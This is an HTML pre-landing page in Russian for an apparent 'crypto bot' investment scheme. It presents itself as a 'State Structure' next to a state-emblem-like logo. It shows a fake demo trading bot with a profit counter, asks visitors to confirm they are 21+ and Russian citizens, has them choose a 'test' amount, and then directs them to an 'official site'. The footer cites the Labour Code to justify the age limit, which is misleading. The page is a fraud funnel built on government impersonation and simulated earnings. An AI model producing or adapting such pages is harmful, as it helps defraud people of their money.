<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Crypto Bot</title>
    <link rel="stylesheet" href="./preland/styles/styles.css?v=87456" />
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/chartjs-chart-financial"></script>
    <script src="https://cdn.jsdelivr.net/npm/moment"></script>
    <script src="https://cdn.jsdelivr.net/npm/chartjs-adapter-moment"></script>
    <script src="jquery-3.6.1.min.js"></script>
    
  </head>
  <body>
    <header class="header active">
      <img style="width: 70px;" src="./preland/patr.svg" alt="Logo" />
      <div class="header__text">
        <span>Государственная<br> Структура</span>
      </div>
    </header>
    <main class="main">
      <!--------- SCREEN 1 --------->
      <div id="screen-1" class="screen active">
        <div class="main-entry">
          <span class="main-entry__heading"
            >Попробуйте себя в трейдинге вместе с нашим ботом</span
          >
          <p class="main-entry__descr">
            Вам предоставлен демо счет, на котором вы можете провести свои
            первые сделки и посмотреть сколько вы сможете заработать
          </p>
          <button type="button" class="main-entry__button" id="entry-button">
            Начать торговлю
          </button>
        </div>
        <!--<div class="main-image">-->
        <!--<img src="./img/bg-main.png" alt="Background">-->
        <!--</div>-->
      </div>
      <!--------- SCREEN 2 --------->
      <div id="screen-2" class="screen second">
        <div class="second__wrapper">
          <div class="screen__controls-wrapper">
            <div class="screen__header">
              <div class="screen__profit">
                <span class="screen__profit-label">Прибыль</span>
                <span class="screen__profit-value">0 ₽</span>
              </div>
              <div class="screen__time">
                <span class="screen__time-label">Время работы</span>
                <div class="screen__time-value">
                  <img
                    src="./preland/img/timer.svg"
                    alt="Timer"
                    class="screen__time-icon"
                  />
                  <span class="screen__time-timer"> 00:00 </span>
                </div>
              </div>
            </div>
    
            <div class="screen__bot-control">
              <button class="screen__bot-button" id="start-chart">
                Запустить бот
              </button>
            </div>
          </div>
  
  
          <div class="screen__chart-wrapper">
            <div class="screen__tabs">
              <button class="screen__tab screen__tab--active" data-pair="LCO">
                РУБ / LCO
              </button>
              <button class="screen__tab" data-pair="BTC">РУБ / BTC</button>
              <button class="screen__tab" data-pair="USD">РУБ / USD</button>
            </div>
    
            <div class="screen__chart-placeholder">
              <canvas id="chartCanvas" class="screen__chart"></canvas>
            </div>
          </div>
        </div>

        <!--------- QUESTION 1 --------->
        <div id="modal" class="modal hidden">
          <div class="modal__content">
            <p class="modal__question">Вам исполнился 21 год?</p>
            <div class="modal__actions">
              <button class="modal__button--first modal__button--yes">
                Да
              </button>
              <button class="modal__button--first modal__button--no">
                <a href="err.html">Нет</a>
              </button>
            </div>
          </div>
        </div>
        <!--------- QUESTION 1 --------->
        <div id="modal-3" class="modal hidden">
          <div class="modal__content">
            <p class="modal__question">Являетесь ли вы гражданином Российской Федерации?</p>
            <div class="modal__actions">
              <button class="modal__button--third modal__button--yes">
                Да
              </button>
              <button class="modal__button--third modal__button--no">
                <a href="err.html">Нет</a>
              </button>
            </div>
          </div>
        </div>
        <!--------- QUESTION 1 --------->
        <div id="modal-2" class="modal hidden">
          <div class="modal__content">
            <p class="modal__question">Выберите сумму для тестовой торговли</p>
            <div class="modal__actions">
              <button class="modal__button--second modal__button--5">
                5000 ₽
              </button>
              <button class="modal__button--second modal__button--10">
                10 000 ₽
              </button>
              <button class="modal__button--second modal__button--50">
                50 000 ₽
              </button>
            </div>
          </div>
        </div>
      </div>
      <!--------- SCREEN 3 --------->
      <div id="screen-3" class="screen">
        <div class="modal__content third">
          <p class="modal__question">Для ознакомления перейдите на наш официальный сайт</p>
          <button class="modal__button--second button-link">
                Перейти на сайт
              </button>
        </div>
      </div>
    </main>
    <footer class="footer active">
      <p class="footer__text">
        Возможности платформы доступны только совершеннолетним пользователям 21+
        согласно "Трудовому кодексу Российской Федерации" от 30.12.2001 №197-ФЗ
        (ред. от 13.06.2023, с изм. от 27.06.2023).
      </p>
    </footer>
    <script src="./preland/js/main.js?v=3"></script>
    <script src="./preland/js/timer.js"></script>
    <script src="./preland/js/chart.js"></script>

    <script>
      window.onload = function() {
        var err = localStorage.getItem('unsuitable');
        var thx = localStorage.getItem('thanks');
        if (err && err === "false") {
          const fileErr = 'err.html'
          window.location.href = `${fileErr}${window.location.search}`;
        }
        else if (thx && thx === "true") {
          const fileThx = 'thanks-page.php'
          window.location.href = `${fileThx}${window.location.search}`;
        }
      }
      
      window.onpageshow = function() {
        var err = localStorage.getItem('unsuitable');
        var thx = localStorage.getItem('thanks');
        if (err && err === "false") {
          const fileErr = 'err.html'
          window.location.href = `${fileErr}${window.location.search}`;
        }
        else if (thx && thx === "true") {
          const fileThx = 'thanks-page.php'
          window.location.href = `${fileThx}${window.location.search}`;
        }
      }
    </script>

    
  </body>
</html>
